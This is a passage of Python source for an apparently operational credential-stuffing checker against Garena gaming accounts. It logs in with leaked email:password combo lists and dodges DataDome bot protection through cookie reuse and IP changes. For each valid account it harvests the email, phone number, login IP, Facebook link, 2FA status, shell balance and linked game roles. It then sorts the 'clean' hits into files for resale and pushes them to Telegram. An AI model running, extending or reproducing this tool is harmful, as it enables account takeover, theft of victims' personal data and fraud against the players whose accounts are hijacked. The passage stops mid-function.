# ============ GET GAME CONNECTIONS ============

def get_game_connections(session, account):
    game_info = []
    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}
    game_mappings = {
        'tw': {'100082': 'CODM', '100067': 'FREE FIRE', '100070': 'SPEED DRIFTERS', '100130': 'BLACK CLOVER M', '100105': 'GARENA UNDAWN', '100050': 'ROV', '100151': 'DELTA FORCE', '100147': 'FAST THRILL', '100107': 'MOONLIGHT BLADE'},
        'th': {'100067': 'FREEFIRE', '100055': 'ROV', '100082': 'CODM', '100151': 'DELTA FORCE', '100105': 'GARENA UNDAWN', '100130': 'BLACK CLOVER M', '100070': 'SPEED DRIFTERS', '32836': 'FC ONLINE', '100071': 'FC ONLINE M', '100124': 'MOONLIGHT BLADE'},
        'vn': {'32837': 'FC ONLINE', '100072': 'FC ONLINE M', '100054': 'ROV', '100137': 'THE WORLD OF WAR'},
        'default': {'100082': 'CODM', '100067': 'FREEFIRE', '100151': 'DELTA FORCE', '100105': 'GARENA UNDAWN', '100057': 'AOV', '100070': 'SPEED DRIFTERS', '100130': 'BLACK CLOVER M', '100055': 'ROV'}
    }
    try:
        token_url = 'https://authgop.garena.com/oauth/token/grant'
        token_data = f'client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}'
        token_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Pragma': 'no-cache', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        try:
            token_resp = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
            access_token = token_resp.json().get('access_token', '')
        except Exception:
            return []
        if not access_token:
            return []
        inspect_url = 'https://shop.garena.sg/api/auth/inspect_token'
        inspect_hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': '*/*', 'Content-Type': 'application/json'}
        try:
            inspect_resp = session.post(inspect_url, headers=inspect_hdrs, json={'token': access_token}, timeout=15)
            inspect_json = inspect_resp.json()
        except Exception:
            return []
        session_key = inspect_resp.cookies.get('session_key')
        if not session_key:
            return []
        uac = inspect_json.get('uac', 'ph').lower()
        region = uac if uac in valid_regions else 'ph'
        if region in ('th', 'in'):
            base_domain = 'termgame.com'
        elif region == 'id':
            base_domain = 'kiosgamer.co.id'
        elif region == 'vn':
            base_domain = 'napthe.vn'
        else:
            base_domain = f'shop.garena.{region}'
        applicable = game_mappings.get(region, game_mappings['default'])
        for app_id, game_name in applicable.items():
            roles_url = f'https://{base_domain}/api/shop/apps/roles'
            roles_hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': 'application/json, text/plain, */*', 'Referer': f'https://{base_domain}/?app={app_id}', 'Cookie': f'session_key={session_key}'}
            try:
                roles_resp = session.get(roles_url, params={'app_id': app_id}, headers=roles_hdrs, timeout=15)
                roles_data = roles_resp.json()
            except Exception:
                continue
            role = None
            if isinstance(roles_data.get('role'), list) and roles_data['role']:
                role = roles_data['role'][0]
            elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
                candidate = roles_data[app_id][0]
                role = candidate.get('role') or candidate.get('user_id') if isinstance(candidate, dict) else str(candidate)
            elif isinstance(roles_data, list) and roles_data:
                first = roles_data[0]
                if isinstance(first, dict) and first.get('role'):
                    role = first['role']
            if role:
                game_info.append({'region': region.upper(), 'game': game_name, 'role': str(role)})
    except Exception as e:
        pass
    return game_info

# ============ SAVE FUNCTIONS ============

def save_game_folder(account, password, account_data, game_connections, base_dir):
    try:
        games_dir = Path(base_dir) / 'Games'
        games_dir.mkdir(parents=True, exist_ok=True)
        identifier = f'{account}:{password}'
        base_entry = f"{identifier}\nEmail: {account_data.get('email_display', 'N/A')}\nMobile: {account_data.get('formatted_mobile', 'N/A')}\nShell: {account_data.get('shell_balance', 0)}\nCountry: {account_data.get('country', 'N/A')}\nLast Login: {account_data.get('last_login_date', 'N/A')}\nLogin Location: {account_data.get('last_login_where', 'N/A')}\nLogin IP: {account_data.get('last_login_ip', 'N/A')}\nFB Status: {account_data.get('fb_info', 'N/A')}\nStatus: {('CLEAN' if account_data.get('is_clean') else 'NOT CLEAN')}\n"
        saved_games = set()
        for g in game_connections:
            gname = g.get('game', '').upper()
            grole = g.get('role', 'N/A')
            gregion = g.get('region', 'N/A')
            if gname in saved_games:
                continue
            saved_games.add(gname)
            fname = GAME_FILE_MAP.get(gname, f"{gname.replace(' ', '_')}.txt")
            fpath = games_dir / fname
            if gname == 'CODM':
                entry = base_entry + f'CODM IGN: {grole}\n' + f"CODM Level: {account_data.get('codm_level', 'N/A')}\n" + f"CODM UID: {account_data.get('codm_uid', 'N/A')}\n" + f'CODM Region: {gregion}\n'
            else:
                entry = base_entry + f'{gname} IGN: {grole}\n' + f'{gname} Region: {gregion}\n'
            already = False
            if fpath.exists():
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                    if identifier in f.read():
                        already = True
            if not already:
                with open(fpath, 'a', encoding='utf-8', errors='replace') as f:
                    f.write(entry.strip() + '\n\n')
    except Exception as e:
        pass

# ============ RESULTS MANAGER ============

class ResultsManager:
    def __init__(self, combo_file_path):
        self.combo_file_name = Path(combo_file_path).stem
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.base_dir = Path(f'Results/output_{self.combo_file_name}')
        for sub in ('Country', 'Level', 'Games', 'Garena Shells'):
            (self.base_dir / sub).mkdir(parents=True, exist_ok=True)

        self._file_locks = {}
        self._locks_meta = threading.Lock()
        self._counter = 0
        self._counter_lock = threading.Lock()

    def _get_flock(self, fp):
        fp = str(fp)
        with self._locks_meta:
            if fp not in self._file_locks:
                self._file_locks[fp] = threading.Lock()
            return self._file_locks[fp]

    def _next_index(self):
        with self._counter_lock:
            self._counter += 1
            return self._counter

    @staticmethod
    def _entry_level(entry):
        m = re.search(r'Level:\s*(\d+)', entry)
        return int(m.group(1)) if m else 0

    def _write_sorted(self, filepath, new_entry_body):
        filepath = str(filepath)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)

        with self._get_flock(filepath):
            entries = []

            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
                    content = f.read()

                raw_entries = content.strip().split('\n' + '=' * 60 + '\n')

                for raw_entry in raw_entries:
                    raw_entry = raw_entry.strip()
                    if raw_entry:
                        if raw_entry.startswith('=' * 60):
                            raw_entry = raw_entry[len('=' * 60):].strip()
                        if raw_entry.endswith('=' * 60):
                            raw_entry = raw_entry[:-len('=' * 60)].strip()
                        entries.append(raw_entry)

            new_entry = new_entry_body.strip()
            if new_entry.startswith('=' * 60):
                new_entry = new_entry[len('=' * 60):].strip()
            if new_entry.endswith('=' * 60):
                new_entry = new_entry[:-len('=' * 60)].strip()

            entries.append(new_entry)
            entries.sort(key=self._entry_level, reverse=True)

            with open(filepath, 'w', encoding='utf-8', errors='replace') as f:
                for i, entry in enumerate(entries):
                    f.write('=' * 60 + '\n')
                    f.write(entry.strip())
                    f.write('\n' + '=' * 60)
                    if i < len(entries) - 1:
                        f.write('\n\n')

    def _append_line(self, filepath, line):
        filepath = str(filepath)
        with self._get_flock(filepath):
            with open(filepath, 'a', encoding='utf-8', errors='replace') as f:
                f.write(line + '\n')

    @staticmethod
    def _ascii(val):
        if not val or val == 'N/A':
            return val
        cleaned = ''.join(c for c in str(val) if c >= ' ' or c in '\t').strip()
        return cleaned or 'N/A'

    def _format_account(self, account_data, index=1):
        acct = account_data.get('account', 'N/A')
        pwd = account_data.get('password', 'N/A')

        if account_data.get('is_error'):
            return ('=' * 60 + f"\nAccount: {acct} : {pwd}\n" + f"Error: {account_data.get('error_reason', 'Unknown')}\n" + '=' * 60)

        is_clean = account_data.get('is_clean', False)
        has_codm = account_data.get('has_codm', False)

        _region_raw = account_data.get('codm_region', 'N/A')
        _region_info = CODM_REGIONS.get(str(_region_raw).upper(), {}) if _region_raw and _region_raw != 'N/A' else {}
        if _region_info:
            _server_str = f"{_region_info['flag']} {_region_info['name']} ({_region_raw})"
        else:
            _server_str = str(_region_raw)

        lines = [
            f"{index}. {acct}:{pwd}",
            f"Clean: {'CLEAN' if is_clean else 'NOT CLEAN'}",
            f"{'CODM: NO ACCOUNT FOUND' if not has_codm else ''}",
            "Status: VALID",
            "",
            "---",
            "Player Info =>",
            f"    UID: {account_data.get('codm_uid', account_data.get('uid', 'N/A'))}",
            f"    Nickname: {self._ascii(account_data.get('codm_nickname', account_data.get('nickname', 'N/A')))}",
            f"    Level: {account_data.get('codm_level', 'N/A')}",
            f"    Shell Balance: {account_data.get('shell_balance', 0)}",
            f"    Region: {account_data.get('country', 'N/A')}",
            f"    Email: {account_data.get('email_display', 'N/A')}",
            f"    Phone: {account_data.get('formatted_mobile', 'N/A')}",
            f"    Server: {_server_str}",
            "",
            "    Bindings:",
            f"        Mobile Bound: {'Yes' if account_data.get('formatted_mobile') not in ['N/A', '', None] else 'No'}",
            f"        Email Verified: {'Yes' if account_data.get('email_verified', False) else 'No'}",
            f"        Facebook Linked: {'Yes' if account_data.get('fb_info') == 'CONNECTED' else 'No'}",
            f"        Authenticator: {'Yes' if account_data.get('auth_app') in ['Yes', True] else 'No'}",
            f"        2FA Enabled: {'Yes' if account_data.get('two_step') in ['Yes', True] else 'No'}",
            "",
            "Login Info =>",
            f"    Last Login: {account_data.get('last_login_date', 'N/A')}",
            f"    Last Login From: {account_data.get('last_login_where', 'N/A')}",
            f"    Last Login IP: {account_data.get('last_login_ip', 'N/A')}",
            f"    Last Login Country: {account_data.get('last_login_country', 'N/A')}",
            "",
            "Facebook =>",
            f"    Username: {self._ascii(account_data.get('fb_username', 'N/A'))}",
            f"    Link: {account_data.get('fb_link', 'N/A')}",
            f"    Status: {account_data.get('fb_info', 'N/A')}",
            "",
            "Powered by @LEGIThea"
        ]

        return "\n".join(line for line in lines if line)

    def add_account(self, account_data):
        if account_data.get('is_error'):
            return
        index = self._next_index()
        entry = self._format_account(account_data, index=index)
        has_codm = account_data.get('has_codm', False)
        is_clean = account_data.get('is_clean', False)
        shell = int(account_data.get('shell_balance', 0) or 0)
        combo = f"{account_data.get('account', '')}:{account_data.get('password', '')}"
        
        valid_path = self.base_dir / 'Valid Accounts.txt'
        self._append_line(valid_path, combo)
        self._write_sorted(self.base_dir / 'All Accounts.txt', entry)
        
        clean_file = 'Clean Accounts.txt' if is_clean else 'Not Clean Accounts.txt'
        self._write_sorted(self.base_dir / clean_file, entry)
        
        country = str(account_data.get('country', 'XX') or 'XX').strip().upper()
        self._write_sorted(self.base_dir / 'Country' / f'{country} Accounts.txt', entry)
        
        if has_codm:
            try:
                lvl = int(account_data.get('codm_level', 0) or 0)
            except (ValueError, TypeError):
                lvl = 0
            if lvl <= 100:
                bucket = '1-100.txt'
            elif lvl <= 200:
                bucket = '101-200.txt'
            elif lvl <= 350:
                bucket = '201-350.txt'
            else:
                bucket = '351-400.txt'
            self._write_sorted(self.base_dir / 'Level' / bucket, entry)
        
        if shell > 0:
            shells_file = 'CODM Accounts.txt' if has_codm else 'NO CODM Accounts.txt'
            self._write_sorted(self.base_dir / 'Garena Shells' / shells_file, entry)

# ============ LIVE STATS ============

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.error_count = 0
        self.highest_clean_level = 0
        self.highest_nc_level = 0
        self.highest_shell = 0
        self.highest_clean_account = None
        self.highest_clean_account_info = None
        self.clean_level_counts = {'351-400': 0, '201-350': 0, '101-200': 0, '1-100': 0}
        self.not_clean_level_counts = {'351-400': 0, '201-350': 0, '101-200': 0, '1-100': 0}
        self.level_distribution = {"1-50": 0, "51-100": 0, "101-150": 0, "151-200": 0, 
                                  "201-250": 0, "251-300": 0, "301-350": 0, "351-400": 0}
        self.categorized_levels = {"1-49": 0, "50-99": 0, "100-199": 0, "200-299": 0, "300-400": 0}
        self.country_distribution = {}
        self.region_distribution = {}
        self.countries = []
        self.regions = []
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.total_accounts = 0
        self.game_counts = {}
        self.last_result_queue = deque(maxlen=200)
        self.valid_hits = []
        self.current_account = ""

    def _categorize_level(self, level, is_clean=False):
        try:
            lvl = int(level)
            if lvl <= 0:
                return
            if is_clean:
                if lvl <= 100: self.clean_level_counts["1-100"] += 1
                elif lvl <= 200: self.clean_level_counts["101-200"] += 1
                elif lvl <= 350: self.clean_level_counts["201-350"] += 1
                else: self.clean_level_counts["351-400"] += 1
            else:
                if lvl <= 100: self.not_clean_level_counts["1-100"] += 1
                elif lvl <= 200: self.not_clean_level_counts["101-200"] += 1
                elif lvl <= 350: self.not_clean_level_counts["201-350"] += 1
                else: self.not_clean_level_counts["351-400"] += 1

            if lvl <= 50: self.level_distribution["1-50"] += 1
            elif lvl <= 100: self.level_distribution["51-100"] += 1
            elif lvl <= 150: self.level_distribution["101-150"] += 1
            elif lvl <= 200: self.level_distribution["151-200"] += 1
            elif lvl <= 250: self.level_distribution["201-250"] += 1
            elif lvl <= 300: self.level_distribution["251-300"] += 1
            elif lvl <= 350: self.level_distribution["301-350"] += 1
            else: self.level_distribution["351-400"] += 1

            if 1 <= lvl <= 49: self.categorized_levels["1-49"] += 1
            elif 50 <= lvl <= 99: self.categorized_levels["50-99"] += 1
            elif 100 <= lvl <= 199: self.categorized_levels["100-199"] += 1
            elif 200 <= lvl <= 299: self.categorized_levels["200-299"] += 1
            elif 300 <= lvl <= 400: self.categorized_levels["300-400"] += 1
        except (ValueError, TypeError):
            pass

    def update_stats(self, valid=False, clean=False, has_codm=False, is_error=False, 
                    codm_level=0, game_connections=None, shell=0, country="N/A", region="N/A",
                    username=None):
        with self.lock:
            if is_error:
                self.error_count += 1
                return
            if not valid:
                self.invalid_count += 1
                return
            self.valid_count += 1
            if clean:
                self.clean_count += 1
                # Track highest clean level
                try:
                    lvl = int(codm_level) if codm_level else 0
                    if lvl > self.highest_clean_level:
                        self.highest_clean_level = lvl
                        if username:
                            self.highest_clean_account = username
                            self.highest_clean_account_info = {
                                'username': username,
                                'level': lvl,
                                'shell': shell,
                                'country': country
                            }
                except:
                    pass
            else:
                self.not_clean_count += 1
            if has_codm:
                self.has_codm_count += 1
            else:
                self.no_codm_count += 1
            try:
                lvl = int(codm_level) if codm_level else 0
                shell = int(shell or 0)
            except:
                lvl, shell = 0, 0
            if lvl > 0:
                if not clean and lvl > self.highest_nc_level:
                    self.highest_nc_level = lvl
                self._categorize_level(lvl, clean)
            if shell > self.highest_shell:
                self.highest_shell = shell
            if country and country != "N/A" and country != "None" and country != "":
                country_clean = re.sub(r'[^A-Za-z]', '', str(country)).upper()
                if country_clean and len(country_clean) >= 2:
                    self.country_distribution[country_clean] = self.country_distribution.get(country_clean, 0) + 1
                    self.countries.append(country_clean)
            if region and region != "N/A" and region != "None" and region != "":
                region_clean = re.sub(r'[^A-Za-z]', '', str(region)).upper()
                if region_clean and len(region_clean) >= 2:
                    self.region_distribution[region_clean] = self.region_distribution.get(region_clean, 0) + 1
                    self.regions.append(region_clean)
            elif has_codm and lvl > 0:
                if country and country != "N/A":
                    region_clean = re.sub(r'[^A-Za-z]', '', str(country)).upper()
                    if region_clean and len(region_clean) >= 2:
                        self.region_distribution[region_clean] = self.region_distribution.get(region_clean, 0) + 1
                        self.regions.append(region_clean)
            for g in (game_connections or []):
                game = g.get("game", "").upper()
                if game == "FREE FIRE":
                    game = "FREEFIRE"
                if game in self.game_counts:
                    self.game_counts[game] += 1
                else:
                    self.game_counts[game] = 1

    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            checked = self.valid_count + self.invalid_count + self.error_count
            progress = (checked / self.total_accounts * 100) if self.total_accounts else 0
            return {
                "valid": self.valid_count,
                "invalid": self.invalid_count,
                "clean": self.clean_count,
                "not_clean": self.not_clean_count,
                "has_codm": self.has_codm_count,
                "no_codm": self.no_codm_count,
                "error": self.error_count,
                "highest_clean_level": self.highest_clean_level,
                "highest_clean_account": self.highest_clean_account,
                "highest_shell": self.highest_shell,
                "clean_level_counts": dict(self.clean_level_counts),
                "not_clean_level_counts": dict(self.not_clean_level_counts),
                "level_distribution": dict(self.level_distribution),
                "categorized_levels": dict(self.categorized_levels),
                "country_distribution": dict(self.country_distribution),
                "region_distribution": dict(self.region_distribution),
                "game_counts": dict(self.game_counts),
                "checked": checked,
                "total": self.total_accounts,
                "elapsed": elapsed,
                "progress": progress,
                "high_lvl": self.highest_clean_level,
                "high_shell": self.highest_shell
            }

    def get_processed_count(self):
        with self.lock:
            return self.valid_count + self.invalid_count + self.error_count

    def push_result(self, success, is_clean=False, has_codm=False, codm_level=0, error_reason=""):
        with self.lock:
            self.last_result_queue.append({
                "success": success,
                "is_clean": is_clean,
                "has_codm": has_codm,
                "codm_level": codm_level,
                "error_reason": error_reason
            })

    def pop_result(self):
        with self.lock:
            return self.last_result_queue.popleft() if self.last_result_queue else None

    def add_hit(self, level, text):
        with self.lock:
            self.valid_hits.append({"level": level, "text": text})

    def add_codm_details(self, level, country, region=None):
        with self.lock:
            if country and country != 'N/A':
                country_clean = re.sub(r'[^A-Za-z]', '', str(country)).upper()
                if country_clean and len(country_clean) >= 2:
                    self.countries.append(country_clean)
            if region and region != 'N/A':
                region_clean = re.sub(r'[^A-Za-z]', '', str(region)).upper()
                if region_clean and len(region_clean) >= 2:
                    self.regions.append(region_clean)
                    self.region_distribution[region_clean] = self.region_distribution.get(region_clean, 0) + 1
            elif country and country != 'N/A':
                country_clean = re.sub(r'[^A-Za-z]', '', str(country)).upper()
                if country_clean and len(country_clean) >= 2:
                    self.region_distribution[country_clean] = self.region_distribution.get(country_clean, 0) + 1
                    self.regions.append(country_clean)
            self._categorize_level(level)

    def update_highest(self, shells, level, is_clean=None):
        with self.lock:
            try:
                s = int(float(str(shells).strip())) if shells else 0
                if s > self.highest_shell:
                    self.highest_shell = s
            except:
                pass
            try:
                l = int(float(str(level).strip())) if level else 0
                if is_clean is True and l > self.highest_clean_level:
                    self.highest_clean_level = l
                elif is_clean is False and l > self.highest_nc_level:
                    self.highest_nc_level = l
                elif l > self.highest_clean_level:
                    self.highest_clean_level = l
            except:
                pass

# ============ PROCESS ACCOUNT ============

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, 
                   results_manager, auto_remove=False, proxy_manager=None):
    max_retries = 2
    attempt = 0

    while True:
        attempt += 1
        try:
            session.cookies.clear()
            init_ga_cookies(session)
            datadome_manager.clear_session_datadome(session)
            current_datadome = datadome_manager.get_datadome()
            if current_datadome:
                datadome_manager.set_session_datadome(session, current_datadome)
            else:
                saved = cookie_manager.get_valid_cookies()
                if saved:
                    picked = random.choice(saved)
                    val = picked.split('=', 1)[1] if '=' in picked else picked
                    datadome_manager.set_datadome(val)
                    datadome_manager.set_session_datadome(session, val)
                else:
                    proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                    datadome = get_datadome_cookie(session, proxies=proxy_dict)
                    if datadome:
                        datadome_manager.set_datadome(datadome)
                        datadome_manager.set_session_datadome(session, datadome)
            
            v1, v2, new_datadome = prelogin(session, account, datadome_manager, cookie_manager, proxy_manager=proxy_manager)
            if v1 == 'IP_BLOCKED':
                if datadome_manager.wait_for_ip_change(session):
                    session.close()
                    session = requests.Session()
                    session.cookies.clear()
                    init_ga_cookies(session)
                    datadome_manager.clear_session_datadome(session)
                    return ('IP_CHANGED', None)
                else:
                    live_stats.update_stats(is_error=True)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'IP Change Timeout'}
                    results_manager.add_account(account_data)
                    return ('ERROR', account_data)
            
            if not v1 or not v2:
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                results_manager.add_account(account_data)
                live_stats.push_result(success=False, error_reason="Account Doesn't Exist")
                console.print(f"➤ {account} → [red]Invalid - Account Doesn't Exist[/red]")
                return ('ERROR', account_data)
            
            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
                datadome_manager.set_session_datadome(session, new_datadome)
            
            sso_key = login(session, account, password, v1, v2)
            if not sso_key:
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Credentials'}
                results_manager.add_account(account_data)
                live_stats.push_result(success=False, error_reason='Wrong Password')
                console.print(f"➤ {account} → [red]Invalid - Incorrect Password[/red]")
                return ('ERROR', account_data)
            
            if isinstance(sso_key, str) and sso_key.startswith('permanent_fail:'):
                reason = sso_key.split(':', 1)[1]
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': reason}
                results_manager.add_account(account_data)
                console.print(f"➤ {account} → [red]Invalid - {reason}[/red]")
                return ('ERROR', account_data)
            
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {'accept': '*/*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
            if cookie_header:
                headers['cookie'] = cookie_header
            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=12)
            
            if response.status_code == 403:
                bad_cookie = session.cookies.get('datadome') or datadome_manager.get_datadome()
                if bad_cookie:
                    cookie_manager.mark_banned(bad_cookie)
                if datadome_manager.handle_403(session):
                    if attempt < max_retries:
                        continue
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Cookie Banned/IP Blocked'}
                results_manager.add_account(account_data)
                return ('ERROR', account_data)
            
            try:
                account_data_json = response.json()
            except json.JSONDecodeError:
                if attempt < max_retries:
                    time.sleep(2)
                    continue
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Server Response'}
                results_manager.add_account(account_data)
                return ('ERROR', account_data)
            
            if 'error_auth' in account_data_json:
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Incorrect Password'}
                results_manager.add_account(account_data)
                console.print(f"➤ {account} → [red]Invalid - Incorrect Password[/red]")
                return ('ERROR', account_data)
            
            if 'error' in account_data_json:
                error_msg = account_data_json.get('error')
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    live_stats.update_stats(valid=False)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                    results_manager.add_account(account_data)
                    console.print(f"➤ {account} → [red]Invalid - Account Doesn't Exist[/red]")
                    return ('ERROR', account_data)
                else:
                    live_stats.update_stats(is_error=True)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': error_msg}
                    results_manager.add_account(account_data)
                    console.print(f"➤ {account} → [red]Invalid - {error_msg}[/red]")
                    return ('ERROR', account_data)
            
            if 'user_info' in account_data_json:
                details = parse_account_details(account_data_json)
                details['login_history'] = account_data_json.get('login_history', [])
            else:
                details = parse_account_details({'user_info': account_data_json})
            
            codm_session = requests.Session()
            for cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                if cookie_name in session.cookies:
                    codm_session.cookies.set(cookie_name, session.cookies.get(cookie_name), domain='.garena.com')
            has_codm, codm_info = check_codm_account(codm_session, account)
            codm_session.close()
            
            game_connections = []
            if CHECK_OTHER_GAMES:
                try:
                    game_connections = get_game_connections(session, account)
                except Exception as _ge:
                    pass
            
            fresh_datadome = datadome_manager.extract_datadome_from_session(session)
            if fresh_datadome:
                cookie_manager.save_cookie(fresh_datadome)
            
            mobile_no = details['personal'].get('mobile_no', 'N/A')
            country_code = details['personal'].get('country_code', 'N/A')
            formatted_mobile = format_mobile_number(mobile_no, country_code)
            email = details.get('email', 'N/A')
            email_verified = details.get('email_verified', False)
            if email and email != 'N/A' and ('@' in email):
                verification_status = '(Verified)' if email_verified else '(Not Verified)'
                email_display = f'{email} {verification_status}'
            else:
                email_display = 'N/A'
            
            fb_username = details['facebook'].get('fb_username', 'N/A')
            fb_uid = details['facebook'].get('fb_uid', 'N/A')
            if fb_uid != 'N/A' and fb_uid:
                fb_link = f'https://www.facebook.com/profile.php?id={fb_uid}'
            else:
                fb_link = 'N/A'
            if fb_uid == 'N/A' or not fb_uid:
                fb_info = 'NOT CONNECTED'
            elif not fb_username or fb_username == 'N/A':
                fb_info = 'FB UNBIND or FB DELETED'
            else:
                fb_info = 'CONNECTED'
            
            login_history = details.get('login_history', [])
            last_login_info = login_history[0] if login_history else {}
            last_login = last_login_info.get('timestamp', 0)
            last_login_date = time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_login)) if last_login else 'N/A'
            last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else 'Unknown'
            last_login_ip = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
            last_login_country = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'
            
            country = details['personal'].get('country', 'N/A')
            region = codm_info.get('region', 'N/A') if has_codm and codm_info else 'N/A'
            if region == 'N/A' and country != 'N/A':
                region = country
            
            account_data = {
                'account': account,
                'password': password,
                'uid': details.get('uid', 'N/A'),
                'username': details.get('username', 'N/A'),
                'nickname': details.get('nickname', 'N/A'),
                'email': details.get('email', 'N/A'),
                'email_verified': details.get('email_verified', False),
                'email_display': email_display,
                'formatted_mobile': formatted_mobile,
                'country': country,
                'region': region,
                'shell_balance': details['profile'].get('shell_balance', 0),
                'account_status': details['status'].get('account_status', 'N/A'),
                'fb_username': fb_username,
                'fb_uid': fb_uid,
                'fb_link': fb_link,
                'fb_info': fb_info,
                'bind_status': details.get('bind_status', 'N/A'),
                'is_clean': details.get('is_clean', False),
                'has_codm': has_codm,
                'is_error': False,
                'last_login_date': last_login_date,
                'last_login_where': last_login_where,
                'last_login_ip': last_login_ip,
                'last_login_country': last_login_country,
                'two_step_verify': details['security'].get('two_step_verify', False),
                'authenticator_app': details['security'].get('authenticator_app', False),
                'game_connections': game_connections or []
            }
            
            if has_codm and codm_info:
                account_data.update({
                    'codm_level': int(codm_info.get('codm_level', 0)),
                    'codm_region': codm_info.get('region', 'N/A'),
                    'codm_nickname': codm_info.get('codm_nickname', 'N/A'),
                    'codm_uid': codm_info.get('uid', 'N/A'),
                    'region_code': codm_info.get('region_code', 'N/A')
                })
            else:
                account_data.update({
                    'codm_level': 0,
                    'codm_region': 'N/A',
                    'codm_nickname': 'N/A',
                    'codm_uid': 'N/A',
                    'region_code': 'N/A'
                })
            
            results_manager.add_account(account_data)
            codm_level = account_data.get('codm_level', 0)
            
            # Get username for display
            username = details.get('username', account)
            status_text = "Clean" if details['is_clean'] else "Not Clean"
            shell = details['profile'].get('shell_balance', 0)
            
            # Update stats with username
            live_stats.update_stats(
                valid=True, 
                clean=details['is_clean'], 
                has_codm=has_codm, 
                codm_level=codm_level, 
                game_connections=game_connections, 
                shell=shell,
                country=country,
                region=region,
                username=username
            )
            live_stats.update_highest(shell, codm_level, details['is_clean'])
            if has_codm:
                live_stats.add_codm_details(codm_level, country, region)
            live_stats.push_result(success=True, is_clean=details['is_clean'], has_codm=has_codm, codm_level=codm_level)
            
            if CHECK_OTHER_GAMES and game_connections:
                save_game_folder(account, password, account_data, game_connections, results_manager.base_dir)
            
            # Display in the requested format - ALL GREEN for valid
            if has_codm and codm_level > 0:
                console.print(f"➤ {username} → [bold green]Valid[/bold green] [bold green]Level {codm_level}[/bold green] [bold green]Shell = {shell}[/bold green] [bold green]Status = {status_text}[/bold green]")
            else:
                console.print(f"➤ {username} → [bold green]Valid[/bold green] [bold green]Level 0[/bold green] [bold green]Shell = {shell}[/bold green] [bold green]Status = {status_text}[/bold green]")
            
            # Send Telegram notification for clean accounts only
            if details['is_clean'] and TELEGRAM_ENABLED:
                threading.Thread(target=send_telegram_clean_hit, args=(account_data,), daemon=True).start()
            
            if auto_remove:
                pass
            
            return ('DONE', account_data)
            
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            session.cookies.clear()
            if attempt < max_retries:
                time.sleep(3)
                continue
            else:
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Connection/Timeout Error'}
                results_manager.add_account(account_data)
                return ('ERROR', account_data)
        except Exception as e:
            if attempt < max_retries:
                time.sleep(2)
                continue
            else:
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': f'Unexpected Error: {str(e)}'}
                results_manager.add_account(account_data)
                return ('ERROR', account_data)

# ============ FIND AND LIST FILES ============

def find_and_list_account_files():
    combo_dir = "Combo"
    if not os.path.exists(combo_dir):
        os.makedirs(combo_dir)
        return None
    
    file_details = []
    for filename in os.listdir(combo_dir):
        file_path = os.path.join(combo_dir, filename)
        if os.path.isfile(file_path) and filename.endswith(".txt"):
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    line_count = sum(1 for line in f if line.strip())
                file_details.append((file_path, os.path.getsize(file_path), line_count))
            except:
                pass
    
    if not file_details:
        return None
    
    console = Console()
    table = Table(box=box.ROUNDED, expand=True, border_style="cyan")
    table.add_column("NO.", justify="center", style="bold yellow")
    table.add_column("FILENAME", style="bold white")
    table.add_column("SIZE", justify="right", style="bold yellow")
    table.add_column("LINES", justify="right", style="bold green")
    
    for i, (path, size, count) in enumerate(file_details, 1):
        name = os.path.basename(path)
